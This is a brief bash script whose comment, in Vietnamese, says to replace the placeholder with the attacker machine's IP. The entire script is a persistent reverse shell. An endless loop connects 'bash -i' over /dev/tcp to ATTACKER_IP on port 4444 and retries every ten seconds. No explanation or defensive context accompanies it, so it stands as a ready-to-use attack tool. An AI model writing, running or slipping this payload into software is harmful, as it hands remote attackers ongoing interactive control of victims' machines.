#!/bin/bash

ATTACKER_IP="10.0.0.1"   # ← Thay bằng IP máy attacker
ATTACKER_PORT=4444

while true; do
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
    sleep 10
done